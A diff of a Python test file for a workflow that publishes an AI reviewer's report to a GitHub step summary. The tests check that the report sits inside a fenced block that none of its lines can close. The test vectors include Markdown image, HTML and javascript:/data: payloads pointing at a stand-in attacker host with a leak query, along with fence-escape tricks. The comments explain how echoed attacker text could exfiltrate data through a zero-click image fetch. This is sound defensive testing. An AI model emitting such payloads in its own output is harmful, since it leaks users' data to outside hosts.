@@ -8,6 +8,7 @@ import pathlib
 import re
 import shutil
 import subprocess  # nosec B404 -- test-only boundary; every argv below is literal
+import sys
 import tempfile
 import unittest
 from pathlib import Path
@@ -86,15 +87,38 @@ BASE_COLLECTOR = ROOT / ".github" / "review-context" / "build_review_context.py"
 PUBLISHER = ROOT / ".github" / "review-context" / "publish_report.py"
 
 
+def _closes_fence(line: str, fence: str) -> bool:
+    """Return whether ``line`` would close a fenced block opened with ``fence``.
+
+    CommonMark: up to three spaces of indent, then a run of the same character at least
+    as long as the opening one, then nothing but whitespace. This is a re-implementation
+    of that rule and shares any misreading of the specification with the subject, so it
+    catches a coding mistake rather than a wrong reading. The real oracle is GitHub's
+    own renderer, which needs the network; Decision 0094 rule 22 records that check and
+    what it returned for every vector below.
+    """
+    match = re.match(r"\A {0,3}(`+)\s*\Z", line)
+    return bool(match) and len(match.group(1)) >= len(fence)
+
+
 def _load_script(path: pathlib.Path) -> Any:
-    """Import a committed review-context script by path."""
+    """Import a committed review-context script by path.
+
+    The directory is put first on the search path for the duration, which is what
+    Python itself does when the workflow runs the script by path, so the shared
+    confinement module imports the same way here as it does in the job.
+    """
     spec = importlib.util.spec_from_file_location(path.stem, path)
     if spec is None:
         raise AssertionError(f"no import spec for {path}")
     if spec.loader is None:
         raise AssertionError(f"no loader for {path}")
     module = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(module)
+    sys.path.insert(0, str(path.parent))
+    try:
+        spec.loader.exec_module(module)
+    finally:
+        sys.path.remove(str(path.parent))
     return module
 
 
@@ -889,157 +913,77 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
         )
         self.assertRegex(args, r"--max-turns \d+")
 
-    def test_the_report_carries_no_render_time_fetch(self) -> None:
+    def test_the_report_is_published_as_literal_text(self) -> None:
         # The hazard is passive: a step summary renders Markdown, so an image URL in a
         # report that echoes attacker-supplied text is fetched with no click. This is
         # the one channel the rest of Decision 0094 does not touch, because every other
         # control governs what the reviewer reads rather than what it publishes.
+        #
+        # The report is therefore not scanned and selectively escaped -- it is placed
+        # inside one fenced block this script owns, where nothing renders. The invariant
+        # is that no line of the report can close that block.
         publisher = _load_script(PUBLISHER)
-        vectors = [
-            "![](https://attacker/?q=secret)",
-            "![alt][ref]",
-            "<img src=https://attacker/x>",
-            "<iframe src=https://attacker/></iframe>",
-            "[click](javascript:alert(1))",
-            "[d](data:text/html;base64,AAA)",
-            "normal **text** and [a link](https://ok/)",
-        ]
-        raw = "\n".join(vectors)
-        cleaned = publisher.neutralise(raw)
-
-        def vectors_in(text: str) -> set[str]:
-            found = set()
-            for line in text.splitlines():
-                if re.search(r"(?<!\\)!\[", line):
-                    found.add("image")
-                if "<" in line or ">" in line:
-                    found.add("html")
-                if re.search(r"(?i)(javascript|data|vbscript):", line):
-                    found.add("scheme")
-            return found
-
-        # Control first: the checks must fire on the raw input, or they prove nothing.
-        self.assertEqual({"image", "html", "scheme"}, vectors_in(raw))
-        self.assertEqual(set(), vectors_in(cleaned))
-        # Ordinary review prose must survive, or the sanitiser is useless.
-        self.assertIn("**text**", cleaned)
-        self.assertIn("[a link](https://ok/)", cleaned)
-
-    def test_no_rendered_line_escapes_the_sanitiser(self) -> None:
-        # The invariant that matters is not "images are escaped somewhere" but: every
-        # line Markdown will actually render must have been sanitised. An earlier
-        # version normalised every fence to three characters, so a four-backtick open
-        # could be "closed" by three and reopened by four -- Markdown left the code
-        # block while the scanner believed it was still inside, and the rest was
-        # published raw.
-        publisher = _load_script(PUBLISHER)
-        tick = "`"
-
-        def rendered_lines(text: str) -> list[str]:
-            """Return the lines CommonMark would render, tracked separately here.
-
-            This is a re-implementation of the rule, not an independent authority: it
-            is written by the same author as the subject and so shares any
-            misconception about CommonMark that the subject has. It catches a *coding*
-            mistake in the sanitiser, which is what a suite can do offline, and it
-            cannot catch a wrong reading of the specification.
-
-            The real oracle is GitHub's own renderer, which needs the network and so
-            cannot run here. Decision 0094 rule 22 records that check, when it was run
-            and against which head: every vector below renders an image before
-            sanitisation and none renders one after.
-            """
-            inside: tuple[str, int] | None = None
-            visible: list[str] = []
-            for line in text.splitlines():
-                match = re.match(r"\A {0,3}(`{3,}|~{3,})(.*)\Z", line)
-                run = match.group(1) if match else ""
-                rest = match.group(2) if match else ""
-                if inside is None:
-                    if match and not (run[0] == "`" and "`" in rest):
-                        inside = (run[0], len(run))
-                        continue
-                    visible.append(line)
-                else:
-                    character, length = inside
-                    if (
-                        match
-                        and run[0] == character
-                        and len(run) >= length
-                        and not rest.strip()
-                    ):
-                        inside = None
-            return visible
-
-        cases = {
-            "four then three then four": [
-                tick * 4,
-                "harmless",
-                tick * 3,
-                tick * 4,
-                "![](https://attacker/?q=leak)",
-            ],
-            "tilde fence with backticks inside": [
-                "~~~",
-                tick * 3,
-                "![](https://inside/)",
-                "~~~",
-                "![](https://outside/)",
-            ],
-            "close with trailing text is not a close": [
-                tick * 3,
-                tick * 3 + " evil",
-                "![](https://inside/)",
-                tick * 3,
-                "![](https://outside/)",
-            ],
-            "indented fence": [
-                "   " + tick * 3,
-                "![](https://inside/)",
-                "   " + tick * 3,
-                "![](https://outside/)",
-            ],
-            "never closed": [tick * 3, "![](https://inside/)"],
-            # CommonMark says a backtick fence's info string may not contain a
-            # backtick, so this line is not a fence and what follows renders.
-            "backtick in the info string": [
-                tick * 3 + "x" + tick,
-                "![](https://outside/)",
-            ],
-            # A tab is four columns of indent, so this is indented code, not a fence.
-            "tab-indented run": ["\t" + tick * 3, "![](https://outside/)"],
-            "over-indented run": ["    " + tick * 3, "![](https://outside/)"],
+        url = "https://attacker.example/?q=leak"
+        vectors = {
+            "inline image": f"![]({url})",
+            "reference image": f"![a][b]\n\n[b]: {url}",
+            "raw img": f'<img src="{url}">',
+            "iframe": f"<iframe src={url}></iframe>",
+            "javascript scheme": "[click](javascript:alert(1))",
+            "data scheme": "[d](data:text/html;base64,AAA)",
+            "closing tags": f'</code></pre><img src="{url}">',
+            "html comment": f'<!-- --><img src="{url}">',
+            # Regression: a fence opened inside a list item is closed by the next
+            # unindented line, because that line cannot continue the item lazily. The
+            # previous line-scanning version believed it was still inside the fence and
+            # published the image raw.
+            "fence inside a list item": f"- a\n  ```\n![]({url})",
+            "fence inside a blockquote": f"> ```\n![]({url})",
+            # Regression: normalising every fence to three characters let a four-tick
+            # open be closed by three and reopened by four.
+            "fence escalation": f"```\n````\n```\n![]({url})\n````",
+            "tab-indented fence": f"\t```\n![]({url})",
+            "backtick in the info string": f"``` `\n![]({url})",
+            "tilde fence": f"~~~\n![]({url})\n~~~\n![]({url})",
+            "a report that closes its own fence": f"```text\n![]({url})\n```\n![]({url})",
+            "ordinary prose": "normal **text** and [a link](https://ok/)",
         }
-        for name, lines in cases.items():
-            with self.subTest(case=name):
-                raw = "\n".join(lines)
-                cleaned = publisher.neutralise(raw)
-                for line in rendered_lines(cleaned):
-                    self.assertNotRegex(
-                        line, r"(?<!\\)!\[", f"{name}: a rendered line kept an image"
-                    )
-                    self.assertNotIn("<", line, f"{name}: a rendered line kept HTML")
-                # Control: the same oracle must find the vector in the raw text, or the
-                # case is not exercising anything.
-                if "outside" in raw or "leak" in raw:
-                    self.assertTrue(
-                        any(
-                            re.search(r"(?<!\\)!\[", line)
-                            for line in rendered_lines(raw)
-                        ),
-                        f"{name}: the raw input rendered no image, so this proves nothing",
+        for name, raw in vectors.items():
+            with self.subTest(vector=name):
+                block = publisher.neutralise(raw)
+                fence = publisher.enclosing_fence(raw)
+                self.assertTrue(block.startswith(f"{fence}text\n"), name)
+                self.assertTrue(block.endswith(f"\n{fence}"), name)
+                # The report is carried through byte for byte: it is data here, not
+                # something to rewrite, and a mangled review is a lost review.
+                self.assertEqual(raw, block[len(fence) + 5 : -(len(fence) + 1)])
+                for line in raw.splitlines():
+                    self.assertFalse(
+                        _closes_fence(line, fence),
+                        f"{name}: a line of the report closes the block",
                     )
 
-    def test_fenced_code_is_left_readable(self) -> None:
-        # Nothing inside a fence renders, and a report about code is unreadable if its
-        # code is escaped.
+    def test_the_fence_outgrows_every_backtick_run_in_the_report(self) -> None:
+        # This is the whole safety argument, so it is exercised directly rather than
+        # only through the vectors above: CommonMark closes a fenced block at a line
+        # whose run is the same character and at least as long as the opening one.
+        publisher = _load_script(PUBLISHER)
+        for length in range(0, 9):
+            with self.subTest(run=length):
+                raw = f"a{'`' * length}b\n{'`' * length}\nc"
+                fence = publisher.enclosing_fence(raw)
+                self.assertGreaterEqual(len(fence), 3)
+                self.assertGreater(len(fence), length)
+                self.assertNotIn(fence, raw)
+
+    def test_the_report_reaches_the_summary_byte_for_byte(self) -> None:
+        # A report about code is worthless if its code is rewritten, and inside the
+        # block there is no reason to rewrite anything.
         publisher = _load_script(PUBLISHER)
         body = (
             "before\n```python\nx = a < b and c > d  # ![](https://x/)\n```\nafter <b>"
         )
-        cleaned = publisher.neutralise(body)
-        self.assertIn("x = a < b and c > d  # ![](https://x/)", cleaned)
-        self.assertIn("after &lt;b&gt;", cleaned)
+        self.assertIn(body, publisher.neutralise(body))
 
     def test_the_report_is_extracted_and_bounded(self) -> None:
         publisher = _load_script(PUBLISHER)
@@ -1105,32 +1049,48 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
                 try:
                     self.assertEqual(
                         inside.resolve(),
-                        module._within(str(inside), variable, must_exist=True),
+                        module.within(str(inside), variable, must_exist=True),
                     )
                     for refused in ("/etc", "/", str(pathlib.Path(root).parent)):
                         with self.subTest(refused=refused):
                             with self.assertRaises(ValueError):
-                                module._within(refused, variable, must_exist=True)
+                                module.within(refused, variable, must_exist=True)
                     # A path that does not exist is refused rather than created.
                     with self.assertRaises(ValueError):
-                        module._within(
-                            str(inside / "absent"), variable, must_exist=True
-                        )
+                        module.within(str(inside / "absent"), variable, must_exist=True)
                     # An empty argument resolves to the working directory, which is a
                     # real path and would otherwise pass every check below it.
                     for degenerate in ("", "   "):
                         with self.subTest(degenerate=repr(degenerate)):
                             with self.assertRaises(ValueError):
-                                module._within(degenerate, variable, must_exist=False)
+                                module.within(degenerate, variable, must_exist=False)
                     # A directory where a file is expected is refused here rather than
                     # failing later with a confusing error.
                     with self.assertRaises(ValueError):
-                        module._within(str(inside), variable, must_exist=False)
+                        module.within(str(inside), variable, must_exist=False)
                 finally:
                     if previous is None:
                         del os.environ[variable]
                     else:
                         os.environ[variable] = previous
+
+    def test_one_confinement_implementation_serves_every_script(self) -> None:
+        # The check was wrong twice -- it accepted a leading dash, and it accepted an
+        # empty argument that resolves to the working directory -- and each time the
+        # fix had to be made in three places. A second copy is a second chance to fix
+        # one and miss another, so there is exactly one implementation and the scripts
+        # import it.
+        shared = ROOT / ".github" / "review-context" / "review_context_paths.py"
+        self.assertTrue(shared.is_file(), "the shared confinement module is missing")
+        for script in (BASE_COLLECTOR, CHUNKER, PUBLISHER):
+            with self.subTest(script=script.name):
+                source = script.read_text(encoding="utf-8")
+                self.assertIn("from review_context_paths import within", source)
+                self.assertNotIn("def within(", source)
+        # Each script is run as `python3 .github/review-context/<name>.py`, so the
+        # directory holding both is what Python puts first on its own search path.
+        # Asserting that here keeps the import from depending on the caller's PATH.
+        self.assertEqual(shared.parent, BASE_COLLECTOR.parent)
 
     def test_the_summary_path_is_checked_without_pinning_a_root(self) -> None:
         # GITHUB_STEP_SUMMARY lives under RUNNER_TEMP on today's hosted runners, but
@@ -1148,11 +1108,11 @@ class ClaudeActionsWorkflowTests(unittest.TestCase):
                 # Accepted although it sits outside RUNNER_TEMP ...
                 self.assertEqual(
                     outside.resolve(),
-                    publisher._within(str(outside), "", must_exist=False),
+                    publisher.within(str(outside), "", must_exist=False),
                 )
                 # ... but a path whose parent does not exist is still refused.
                 with self.assertRaises(ValueError):
-                    publisher._within(
+                    publisher.within(
                         str(pathlib.Path(elsewhere) / "absent" / "summary.md"),
                         "",
                         must_exist=False,
